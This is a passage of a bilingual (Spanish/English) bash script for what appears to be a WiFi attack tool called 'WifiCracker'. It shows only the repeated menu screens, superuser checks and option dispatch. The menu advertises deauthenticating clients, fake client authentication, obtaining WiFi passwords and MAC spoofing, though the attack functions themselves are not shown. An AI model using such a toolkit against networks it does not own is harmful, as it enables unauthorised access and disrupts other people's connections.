        echo -e "$blueColour  1$endColour.$yellowColour Iniciar el modo monitor$endColour         $blueColour||$endColour $blueColour 11$endColour.$yellowColour Reparar conexión de red      $endColour  $greenColour*$endColour"
        echo -e "$blueColour  2$endColour.$yellowColour Mostrar interfaces$endColour              $blueColour||$endColour $blueColour 12$endColour.$yellowColour Dispositivos conectados      $endColour  $greenColour*$endColour"
        echo -e "$blueColour  3$endColour.$yellowColour Dar de baja el modo monitor$endColour     $blueColour||$endColour $blueColour 13$endColour.$yellowColour Ver Proyecto                 $endColour  $greenColour*$endColour"
        echo -e "$blueColour  4$endColour.$yellowColour Escanear redes wifis$endColour            $blueColour||$endColour $blueColour 14$endColour.$yellowColour Abrir nueva terminal         $endColour  $greenColour*$endColour"
        echo -e "$blueColour  5$endColour.$yellowColour Deautenticación a dirección MAC$endColour $blueColour||$endColour $blueColour 15$endColour.$yellowColour Reiniciar programa           $endColour  $greenColour*$endColour"
        echo -e "$blueColour  6$endColour.$yellowColour Falsa autenticación de cliente$endColour  $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  7$endColour.$yellowColour Obtener contraseña Wifi$endColour         $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  8$endColour.$yellowColour Mostrar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  9$endColour.$yellowColour Cambiar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour 10$endColour.$yellowColour Instalar programas necesarios$endColour  $blueColour ||$endColour                                     $greenColour*$endColour "
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "$purpleColour---------------------------------------------------$endColour"
        echo -e "$grayColour [[-h | --help ] [-a | --author] [-v | --version]]$endColour$purpleColour|$endColour"
        echo -e "$purpleColour---------------------------------------------------$endColour"
        echo -e "$redColour 0. Salir$endColour $blueColour||$endColour $grayColour? - Mostrar IP$endColour $purpleColour|$endColour"
        echo -e "$purpleColour----------------------------$endColour"
        sleep 0.5
        echo " "
        entrada=3
      fi

      if [ "$entrada" = "3" ]; then
        clear
        echo " "
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "$redColour                        ╔╗╔╗╔╗─╔═╗╔═══╗───────╔╗$endColour                            $greenColour*$endColour"
        echo -e "$redColour                        ║║║║║║─║╔╝║╔═╗║───────║║$endColour                            $greenColour*$endColour"
        echo -e "$redColour                        ║║║║║╠╦╝╚╦╣║─╚╬═╦══╦══╣║╔╦══╦═╗$endColour                     $greenColour*$endColour"
        echo -e "$redColour                        ║╚╝╚╝╠╬╗╔╬╣║─╔╣╔╣╔╗║╔═╣╚╝╣║═╣╔╝$endColour  $blueColour(v0.1.8)$endColour           $greenColour*$endColour"
        echo -e "$redColour                        ╚╗╔╗╔╣║║║║║╚═╝║║║╔╗║╚═╣╔╗╣║═╣║ $endColour                     $greenColour*$endColour"
        echo -e "$redColour                        ─╚╝╚╝╚╝╚╝╚╩═══╩╝╚╝╚╩══╩╝╚╩══╩╝ $endColour                     $greenColour*$endColour"
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$blueColour  1$endColour.$yellowColour Iniciar el modo monitor$endColour         $blueColour||$endColour $blueColour 11$endColour.$yellowColour Reparar conexión de red      $endColour  $greenColour*$endColour"
        echo -e "$blueColour  2$endColour.$yellowColour Mostrar interfaces$endColour              $blueColour||$endColour $blueColour 12$endColour.$yellowColour Dispositivos conectados      $endColour  $greenColour*$endColour"
        echo -e "$blueColour  3$endColour.$yellowColour Dar de baja el modo monitor$endColour     $blueColour||$endColour $blueColour 13$endColour.$yellowColour Ver Proyecto                 $endColour  $greenColour*$endColour"
        echo -e "$blueColour  4$endColour.$yellowColour Escanear redes wifis$endColour            $blueColour||$endColour $blueColour 14$endColour.$yellowColour Abrir nueva terminal         $endColour  $greenColour*$endColour"
        echo -e "$blueColour  5$endColour.$yellowColour Deautenticación a dirección MAC$endColour $blueColour||$endColour $blueColour 15$endColour.$yellowColour Reiniciar programa           $endColour  $greenColour*$endColour"
        echo -e "$blueColour  6$endColour.$yellowColour Falsa autenticación de cliente$endColour  $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  7$endColour.$yellowColour Obtener contraseña Wifi$endColour         $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  8$endColour.$yellowColour Mostrar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  9$endColour.$yellowColour Cambiar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour 10$endColour.$yellowColour Instalar programas necesarios$endColour  $blueColour ||$endColour                                     $greenColour*$endColour "
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "$purpleColour---------------------------------------------------$endColour"
        echo -e "$grayColour [[-h | --help ] [-a | --author] [-v | --version]]$endColour$purpleColour|$endColour"
        echo -e "$purpleColour---------------------------------------------------$endColour"
        echo -e "$redColour 0. Salir$endColour $blueColour||$endColour $grayColour? - Mostrar IP$endColour $purpleColour|$endColour"
        echo -e "$purpleColour----------------------------$endColour"
        sleep 0.5
        echo " "
        entrada=4
      fi

      if [ "$entrada" = "4" ]; then
        clear
        echo " "
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$blueColour  1$endColour.$yellowColour Iniciar el modo monitor$endColour         $blueColour||$endColour $blueColour 11$endColour.$yellowColour Reparar conexión de red      $endColour  $greenColour*$endColour"
        echo -e "$blueColour  2$endColour.$yellowColour Mostrar interfaces$endColour              $blueColour||$endColour $blueColour 12$endColour.$yellowColour Dispositivos conectados      $endColour  $greenColour*$endColour"
        echo -e "$blueColour  3$endColour.$yellowColour Dar de baja el modo monitor$endColour     $blueColour||$endColour $blueColour 13$endColour.$yellowColour Ver Proyecto                 $endColour  $greenColour*$endColour"
        echo -e "$blueColour  4$endColour.$yellowColour Escanear redes wifis$endColour            $blueColour||$endColour $blueColour 14$endColour.$yellowColour Abrir nueva terminal         $endColour  $greenColour*$endColour"
        echo -e "$blueColour  5$endColour.$yellowColour Deautenticación a dirección MAC$endColour $blueColour||$endColour $blueColour 15$endColour.$yellowColour Reiniciar programa           $endColour  $greenColour*$endColour"
        echo -e "$blueColour  6$endColour.$yellowColour Falsa autenticación de cliente$endColour  $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  7$endColour.$yellowColour Obtener contraseña Wifi$endColour         $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  8$endColour.$yellowColour Mostrar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  9$endColour.$yellowColour Cambiar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour 10$endColour.$yellowColour Instalar programas necesarios$endColour  $blueColour ||$endColour                                     $greenColour*$endColour "
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "$purpleColour---------------------------------------------------$endColour"
        echo -e "$grayColour [[-h | --help ] [-a | --author] [-v | --version]]$endColour$purpleColour|$endColour"
        echo -e "$purpleColour---------------------------------------------------$endColour"
        echo -e "$redColour 0. Salir$endColour $blueColour||$endColour $grayColour? - Mostrar IP$endColour $purpleColour|$endColour"
        echo -e "$purpleColour----------------------------$endColour"
        sleep 0.5
        echo " "
        entrada=5
      fi

      if [ "$entrada" = "5" ]; then
        clear
        echo " "
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "$redColour                        ╔╗╔╗╔╗─╔═╗╔═══╗───────╔╗$endColour                            $greenColour*$endColour"
        echo -e "$redColour                        ║║║║║║─║╔╝║╔═╗║───────║║$endColour                            $greenColour*$endColour"
        echo -e "$redColour                        ║║║║║╠╦╝╚╦╣║─╚╬═╦══╦══╣║╔╦══╦═╗$endColour                     $greenColour*$endColour"
        echo -e "$redColour                        ║╚╝╚╝╠╬╗╔╬╣║─╔╣╔╣╔╗║╔═╣╚╝╣║═╣╔╝$endColour  $blueColour(v0.1.8)$endColour           $greenColour*$endColour"
        echo -e "$redColour                        ╚╗╔╗╔╣║║║║║╚═╝║║║╔╗║╚═╣╔╗╣║═╣║ $endColour                     $greenColour*$endColour"
        echo -e "$redColour                        ─╚╝╚╝╚╝╚╝╚╩═══╩╝╚╝╚╩══╩╝╚╩══╩╝ $endColour                     $greenColour*$endColour"
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$blueColour  1$endColour.$yellowColour Iniciar el modo monitor$endColour         $blueColour||$endColour $blueColour 11$endColour.$yellowColour Reparar conexión de red      $endColour  $greenColour*$endColour"
        echo -e "$blueColour  2$endColour.$yellowColour Mostrar interfaces$endColour              $blueColour||$endColour $blueColour 12$endColour.$yellowColour Dispositivos conectados      $endColour  $greenColour*$endColour"
        echo -e "$blueColour  3$endColour.$yellowColour Dar de baja el modo monitor$endColour     $blueColour||$endColour $blueColour 13$endColour.$yellowColour Ver Proyecto                 $endColour  $greenColour*$endColour"
        echo -e "$blueColour  4$endColour.$yellowColour Escanear redes wifis$endColour            $blueColour||$endColour $blueColour 14$endColour.$yellowColour Abrir nueva terminal         $endColour  $greenColour*$endColour"
        echo -e "$blueColour  5$endColour.$yellowColour Deautenticación a dirección MAC$endColour $blueColour||$endColour $blueColour 15$endColour.$yellowColour Reiniciar programa           $endColour  $greenColour*$endColour"
        echo -e "$blueColour  6$endColour.$yellowColour Falsa autenticación de cliente$endColour  $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  7$endColour.$yellowColour Obtener contraseña Wifi$endColour         $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  8$endColour.$yellowColour Mostrar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  9$endColour.$yellowColour Cambiar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour 10$endColour.$yellowColour Instalar programas necesarios$endColour  $blueColour ||$endColour                                     $greenColour*$endColour "
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "$purpleColour---------------------------------------------------$endColour"
        echo -e "$grayColour [[-h | --help ] [-a | --author] [-v | --version]]$endColour$purpleColour|$endColour"
        echo -e "$purpleColour---------------------------------------------------$endColour"
        echo -e "$redColour 0. Salir$endColour $blueColour||$endColour $grayColour? - Mostrar IP$endColour $purpleColour|$endColour"
        echo -e "$purpleColour----------------------------$endColour"
        echo " "
      fi
      if [ "$(id -u)" != "0" ] && [ "$entradaPrincipal" == "0" ]; then
        zenity --info --text="IMPORTANTE: La mayoría de funciones del programa sólo funcionan siendo superusuario. Has entrado como usuario normal."
        entradaPrincipal=1
        echo " "
      fi
      if [ "$typeUser" = "0" ]; then
        if [ "$(id -u)" = "0" ]; then
          echo -e "$grayColour ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$endColour"
          echo -e "$blueColour Has entrado como:$endColour$greenColour $USER$endColour -$redColour Superusuario$endColour"
          echo -e "$grayColour ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$endColour"
          echo " "
          typeUser=1
        elif [ "$(id -u)" != "0" ]; then
          echo -e "$grayColour ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$endColour"
          echo -e "$blueColour Has entrado como:$endColour$greenColour $USER$endColour $redColour- Usuario Normal$endColour"
          echo -e "$grayColour ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$endColour"
          echo " "
          typeUser=1
        fi
      fi
      echo -n -e "$yellowColour Introduzca una opcion -> $endColour"
      read opcionMenu

      case $opcionMenu in

        1 ) monitorMode ;;

        2 ) interfacesMode ;;

        3 ) monitorDown ;;

        4 ) wifiScanner ;;

        5 ) macAttack ;;

        6 ) fakeAuth ;;

        7 ) wifiPassword ;;

        8 ) showMAC ;;

        9 ) changeMAC ;;

        10 ) necessaryPrograms ;;

        11 ) repairNetwork ;;

        12 ) connectedDevices ;;

        13 ) showProject ;;

        14 ) openTerminal ;;

        15 ) resetProgram ;;

        -h | --help ) panelHelp ;;

        -a | --author ) autorInfo ;;

        -v | --version ) versionSystem ;;

        -h1 ) monitorHelp ;;

        -h2 ) interfacesHelp ;;

        -h3 ) monitorDownHelp ;;

        -h4 ) wifiScannerHelp ;;

        -h5 ) macAttackHelp ;;

        -h6 ) fakeAuthHelp ;;

        -h7 ) wifiPasswordHelp ;;

        -h8 ) showMacHelp ;;

        -h9 ) changeMacHelp ;;

        -h11 ) repairNetworkHelp ;;

        -h12 ) connectedDev ;;

        0 ) echo " "
        exit
        ;;

        ? ) showIP ;;


        * ) echo " "
            echo -e "$redColour Esta opción no existe, vuelva a intentarlo$endColour"
            echo " "
            sleep 2
            ;;
      esac
  done
elif [ "$language" = "English" ]; then
  engOptions=1
  spanOptions=0
  while true
    do
      if [ "$entrada" = "1" ]; then
        clear
        echo " "
        sleep 0.4
        echo -e "$greenColour*****************************************************************************$endColour"
        sleep 0.5
        echo -e "$redColour                        ╔╗╔╗╔╗─╔═╗╔═══╗───────╔╗$endColour                            $greenColour*$endColour"
        sleep 0.1
        echo -e "$redColour                        ║║║║║║─║╔╝║╔═╗║───────║║$endColour                            $greenColour*$endColour"
        sleep 0.1
        echo -e "$redColour                        ║║║║║╠╦╝╚╦╣║─╚╬═╦══╦══╣║╔╦══╦═╗$endColour                     $greenColour*$endColour"
        sleep 0.1
        echo -e "$redColour                        ║╚╝╚╝╠╬╗╔╬╣║─╔╣╔╣╔╗║╔═╣╚╝╣║═╣╔╝$endColour  $blueColour(v0.1.8)$endColour           $greenColour*$endColour"
        sleep 0.1
        echo -e "$redColour                        ╚╗╔╗╔╣║║║║║╚═╝║║║╔╗║╚═╣╔╗╣║═╣║ $endColour                     $greenColour*$endColour"
        sleep 0.1
        echo -e "$redColour                        ─╚╝╚╝╚╝╚╝╚╩═══╩╝╚╝╚╩══╩╝╚╩══╩╝ $endColour                     $greenColour*$endColour"
        sleep 0.
        echo -e "$greenColour*****************************************************************************$endColour"
        sleep 0.5
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$blueColour  1$endColour.$yellowColour Start monitor mode$endColour              $blueColour||$endColour $blueColour 11$endColour.$yellowColour Repair network connection    $endColour  $greenColour*$endColour"
        sleep 0.1
        echo -e "$blueColour  2$endColour.$yellowColour Show interfaces$endColour                 $blueColour||$endColour $blueColour 12$endColour.$yellowColour Connected Devices            $endColour  $greenColour*$endColour"
        sleep 0.1
        echo -e "$blueColour  3$endColour.$yellowColour Disable monitor mode$endColour            $blueColour||$endColour $blueColour 13$endColour.$yellowColour View Project                 $endColour  $greenColour*$endColour"
        sleep 0.1
        echo -e "$blueColour  4$endColour.$yellowColour Scan Wifi Networks$endColour              $blueColour||$endColour $blueColour 14$endColour.$yellowColour Open new terminal            $endColour  $greenColour*$endColour"
        sleep 0.1
        echo -e "$blueColour  5$endColour.$yellowColour De-authenticate MAC adress$endColour      $blueColour||$endColour $blueColour 15$endColour.$yellowColour Restart Program              $endColour  $greenColour*$endColour"
        sleep 0.1
        echo -e "$blueColour  6$endColour.$yellowColour Fake client authentication    $endColour  $blueColour||$endColour                                     $greenColour*$endColour "
        sleep 0.1
        echo -e "$blueColour  7$endColour.$yellowColour Get Wifi Password$endColour               $blueColour||$endColour                                     $greenColour*$endColour "
        sleep 0.1
        echo -e "$blueColour  8$endColour.$yellowColour Show MAC adress (mon0)$endColour          $blueColour||$endColour                                     $greenColour*$endColour "
        sleep 0.1
        echo -e "$blueColour  9$endColour.$yellowColour Change MAC adress (mon0)$endColour        $blueColour||$endColour                                     $greenColour*$endColour "
        sleep 0.1
        echo -e "$blueColour 10$endColour.$yellowColour Install necessary programs$endColour      $blueColour||$endColour                                     $greenColour*$endColour "
        sleep 0.1
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$greenColour*****************************************************************************$endColour"
        sleep 0.1
        echo -e "$purpleColour---------------------------------------------------$endColour"
        sleep 0.1
        echo -e "$grayColour [[-h | --help ] [-a | --author] [-v | --version]]$endColour$purpleColour|$endColour"
        sleep 0.1
        echo -e "$purpleColour---------------------------------------------------$endColour"
        sleep 0.1
        echo -e "$redColour 0. Exit$endColour $blueColour||$endColour $grayColour? - Show IP$endColour $purpleColour|$endColour"
        echo -e "$purpleColour-------------------------$endColour"
        sleep 0.5
        echo " "
        entrada=2
      fi

      if [ "$entrada" = "2" ]; then
        clear
        echo " "
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$blueColour  1$endColour.$yellowColour Start monitor mode$endColour              $blueColour||$endColour $blueColour 11$endColour.$yellowColour Repair network connection    $endColour  $greenColour*$endColour"
        echo -e "$blueColour  2$endColour.$yellowColour Show interfaces$endColour                 $blueColour||$endColour $blueColour 12$endColour.$yellowColour Connected Devices            $endColour  $greenColour*$endColour"
        echo -e "$blueColour  3$endColour.$yellowColour Disable monitor mode$endColour            $blueColour||$endColour $blueColour 13$endColour.$yellowColour View Project                 $endColour  $greenColour*$endColour"
        echo -e "$blueColour  4$endColour.$yellowColour Scan Wifi Networks$endColour              $blueColour||$endColour $blueColour 14$endColour.$yellowColour Open new terminal            $endColour  $greenColour*$endColour"
        echo -e "$blueColour  5$endColour.$yellowColour De-authenticate MAC adress$endColour      $blueColour||$endColour $blueColour 15$endColour.$yellowColour Restart Program              $endColour  $greenColour*$endColour"
        echo -e "$blueColour  6$endColour.$yellowColour Fake client authentication    $endColour  $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  7$endColour.$yellowColour Get Wifi Password$endColour               $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  8$endColour.$yellowColour Show MAC adress (mon0)$endColour          $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  9$endColour.$yellowColour Change MAC adress (mon0)$endColour        $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour 10$endColour.$yellowColour Install necessary programs$endColour      $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "$purpleColour---------------------------------------------------$endColour"
        echo -e "$grayColour [[-h | --help ] [-a | --author] [-v | --version]]$endColour$purpleColour|$endColour"
        echo -e "$purpleColour---------------------------------------------------$endColour"
        echo -e "$redColour 0. Exit$endColour $blueColour||$endColour $grayColour? - Show IP$endColour $purpleColour|$endColour"
        echo -e "$purpleColour-------------------------$endColour"
        sleep 0.5
        echo " "
        entrada=3
      fi

      if [ "$entrada" = "3" ]; then
        clear
        echo " "
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "$redColour                        ╔╗╔╗╔╗─╔═╗╔═══╗───────╔╗$endColour                            $greenColour*$endColour"
        echo -e "$redColour                        ║║║║║║─║╔╝║╔═╗║───────║║$endColour                            $greenColour*$endColour"
        echo -e "$redColour                        ║║║║║╠╦╝╚╦╣║─╚╬═╦══╦══╣║╔╦══╦═╗$endColour                     $greenColour*$endColour"
        echo -e "$redColour                        ║╚╝╚╝╠╬╗╔╬╣║─╔╣╔╣╔╗║╔═╣╚╝╣║═╣╔╝$endColour  $blueColour(v0.1.8)$endColour           $greenColour*$endColour"
        echo -e "$redColour                        ╚╗╔╗╔╣║║║║║╚═╝║║║╔╗║╚═╣╔╗╣║═╣║ $endColour                     $greenColour*$endColour"
        echo -e "$redColour                        ─╚╝╚╝╚╝╚╝╚╩═══╩╝╚╝╚╩══╩╝╚╩══╩╝ $endColour                     $greenColour*$endColour"
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$blueColour  1$endColour.$yellowColour Start monitor mode$endColour              $blueColour||$endColour $blueColour 11$endColour.$yellowColour Repair network connection    $endColour  $greenColour*$endColour"
        echo -e "$blueColour  2$endColour.$yellowColour Show interfaces$endColour                 $blueColour||$endColour $blueColour 12$endColour.$yellowColour Connected Devices            $endColour  $greenColour*$endColour"
        echo -e "$blueColour  3$endColour.$yellowColour Disable monitor mode$endColour            $blueColour||$endColour $blueColour 13$endColour.$yellowColour View Project                 $endColour  $greenColour*$endColour"
        echo -e "$blueColour  4$endColour.$yellowColour Scan Wifi Networks$endColour              $blueColour||$endColour $blueColour 14$endColour.$yellowColour Open new terminal            $endColour  $greenColour*$endColour"
        echo -e "$blueColour  5$endColour.$yellowColour De-authenticate MAC adress$endColour      $blueColour||$endColour $blueColour 15$endColour.$yellowColour Restart Program              $endColour  $greenColour*$endColour"
        echo -e "$blueColour  6$endColour.$yellowColour Fake client authentication    $endColour  $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  7$endColour.$yellowColour Get Wifi Password$endColour               $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  8$endColour.$yellowColour Show MAC adress (mon0)$endColour          $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  9$endColour.$yellowColour Change MAC adress (mon0)$endColour        $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour 10$endColour.$yellowColour Install necessary programs$endColour      $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "$purpleColour---------------------------------------------------$endColour"
        echo -e "$grayColour [[-h | --help ] [-a | --author] [-v | --version]]$endColour$purpleColour|$endColour"
        echo -e "$purpleColour---------------------------------------------------$endColour"
        echo -e "$redColour 0. Exit$endColour $blueColour||$endColour $grayColour? - Show IP$endColour $purpleColour|$endColour"
        echo -e "$purpleColour-------------------------$endColour"
        sleep 0.5
        echo " "
        entrada=4
      fi

      if [ "$entrada" = "4" ]; then
        clear
        echo " "
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$blueColour  1$endColour.$yellowColour Start monitor mode$endColour              $blueColour||$endColour $blueColour 11$endColour.$yellowColour Repair network connection    $endColour  $greenColour*$endColour"
        echo -e "$blueColour  2$endColour.$yellowColour Show interfaces$endColour                 $blueColour||$endColour $blueColour 12$endColour.$yellowColour Connected Devices            $endColour  $greenColour*$endColour"
        echo -e "$blueColour  3$endColour.$yellowColour Disable monitor mode$endColour            $blueColour||$endColour $blueColour 13$endColour.$yellowColour View Project                 $endColour  $greenColour*$endColour"
        echo -e "$blueColour  4$endColour.$yellowColour Scan Wifi Networks$endColour              $blueColour||$endColour $blueColour 14$endColour.$yellowColour Open new terminal            $endColour  $greenColour*$endColour"
        echo -e "$blueColour  5$endColour.$yellowColour De-authenticate MAC adress$endColour      $blueColour||$endColour $blueColour 15$endColour.$yellowColour Restart Program              $endColour  $greenColour*$endColour"
        echo -e "$blueColour  6$endColour.$yellowColour Fake client authentication    $endColour  $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  7$endColour.$yellowColour Get Wifi Password$endColour               $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  8$endColour.$yellowColour Show MAC adress (mon0)$endColour          $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  9$endColour.$yellowColour Change MAC adress (mon0)$endColour        $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour 10$endColour.$yellowColour Install necessary programs$endColour      $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "$purpleColour---------------------------------------------------$endColour"
        echo -e "$grayColour [[-h | --help ] [-a | --author] [-v | --version]]$endColour$purpleColour|$endColour"
        echo -e "$purpleColour---------------------------------------------------$endColour"
        echo -e "$redColour 0. Exit$endColour $blueColour||$endColour $grayColour? - Show IP$endColour $purpleColour|$endColour"
        echo -e "$purpleColour-------------------------$endColour"
        sleep 0.5
        echo " "
        entrada=5
      fi

      if [ "$entrada" = "5" ]; then
        clear
        echo " "
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "$redColour                        ╔╗╔╗╔╗─╔═╗╔═══╗───────╔╗$endColour                            $greenColour*$endColour"
        echo -e "$redColour                        ║║║║║║─║╔╝║╔═╗║───────║║$endColour                            $greenColour*$endColour"
        echo -e "$redColour                        ║║║║║╠╦╝╚╦╣║─╚╬═╦══╦══╣║╔╦══╦═╗$endColour                     $greenColour*$endColour"
        echo -e "$redColour                        ║╚╝╚╝╠╬╗╔╬╣║─╔╣╔╣╔╗║╔═╣╚╝╣║═╣╔╝$endColour  $blueColour(v0.1.8)$endColour           $greenColour*$endColour"
        echo -e "$redColour                        ╚╗╔╗╔╣║║║║║╚═╝║║║╔╗║╚═╣╔╗╣║═╣║ $endColour                     $greenColour*$endColour"
        echo -e "$redColour                        ─╚╝╚╝╚╝╚╝╚╩═══╩╝╚╝╚╩══╩╝╚╩══╩╝ $endColour                     $greenColour*$endColour"
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$blueColour  1$endColour.$yellowColour Start monitor mode$endColour              $blueColour||$endColour $blueColour 11$endColour.$yellowColour Repair network connection    $endColour  $greenColour*$endColour"
        echo -e "$blueColour  2$endColour.$yellowColour Show interfaces$endColour                 $blueColour||$endColour $blueColour 12$endColour.$yellowColour Connected Devices            $endColour  $greenColour*$endColour"
        echo -e "$blueColour  3$endColour.$yellowColour Disable monitor mode$endColour            $blueColour||$endColour $blueColour 13$endColour.$yellowColour View Project                 $endColour  $greenColour*$endColour"
        echo -e "$blueColour  4$endColour.$yellowColour Scan Wifi Networks$endColour              $blueColour||$endColour $blueColour 14$endColour.$yellowColour Open new terminal            $endColour  $greenColour*$endColour"
        echo -e "$blueColour  5$endColour.$yellowColour De-authenticate MAC adress$endColour      $blueColour||$endColour $blueColour 15$endColour.$yellowColour Restart Program              $endColour  $greenColour*$endColour"
        echo -e "$blueColour  6$endColour.$yellowColour Fake client authentication    $endColour  $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  7$endColour.$yellowColour Get Wifi Password$endColour               $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  8$endColour.$yellowColour Show MAC adress (mon0)$endColour          $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour  9$endColour.$yellowColour Change MAC adress (mon0)$endColour        $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "$blueColour 10$endColour.$yellowColour Install necessary programs$endColour      $blueColour||$endColour                                     $greenColour*$endColour "
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "$purpleColour---------------------------------------------------$endColour"
        echo -e "$grayColour [[-h | --help ] [-a | --author] [-v | --version]]$endColour$purpleColour|$endColour"
        echo -e "$purpleColour---------------------------------------------------$endColour"
        echo -e "$redColour 0. Exit$endColour $blueColour||$endColour $grayColour? - Show IP$endColour $purpleColour|$endColour"
        echo -e "$purpleColour-------------------------$endColour"
        echo " "
      fi
      if [ "$(id -u)" != "0" ] && [ "$entradaPrincipal" == "0" ]; then
        zenity --info --text="Warning: Most program functions only works as superuser. You have been logged as normal user."
        entradaPrincipal=1
        echo " "
      fi
      if [ "$typeUser" = "0" ]; then
        if [ "$(id -u)" = "0" ]; then
          echo -e "$grayColour ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$endColour"
          echo -e "$blueColour Logged as:$endColour$greenColour $USER$endColour -$redColour Superuser$endColour"
          echo -e "$grayColour ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$endColour"
          echo " "
          typeUser=1
        elif [ "$(id -u)" != "0" ]; then
          echo -e "$grayColour ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$endColour"
          echo -e "$blueColour Logged as:$endColour$greenColour $USER$endColour $redColour- Normal User$endColour"
          echo -e "$grayColour ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$endColour"
          echo " "
          typeUser=1
        fi
      fi
      echo -n -e "$yellowColour Enter an option -> $endColour"
      read opcionMenu

      case $opcionMenu in

        1 ) monitorMode ;;

        2 ) interfacesMode ;;

        3 ) monitorDown ;;

        4 ) wifiScanner ;;

        5 ) macAttack ;;

        6 ) fakeAuth ;;

        7 ) wifiPassword ;;

        8 ) showMAC ;;

        9 ) changeMAC ;;

